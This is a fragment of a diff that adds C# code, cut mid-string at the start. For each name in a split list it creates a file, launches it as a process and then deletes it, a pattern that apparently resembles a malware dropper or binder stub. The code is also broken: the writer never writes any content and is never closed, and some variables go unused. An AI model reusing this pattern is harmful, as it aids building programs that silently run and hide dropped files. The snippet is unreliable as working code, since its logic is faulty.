@@ -1,0 +1,23 @@
+";
+
+
+string[] list = text.Split(',');
+string fileext = list[0];
+string[] fileext2 = fileext.Split('.');
+string filenames = list[1];
+string[] filenames2 = filenames.Split('%');
+int a = 0;
+int b = 0;
+for (int i = 2; i < list.Count(); i++, a++)
+{
+    StreamWriter writer = new StreamWriter(filenames2[a]);
+    Process ExternalProcess = new Process();
+    ExternalProcess.StartInfo.FileName = filenames2[a];
+    ExternalProcess.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
+    ExternalProcess.Start();
+    File.Delete(filenames2[a]);
+}
+   
+   
+
+
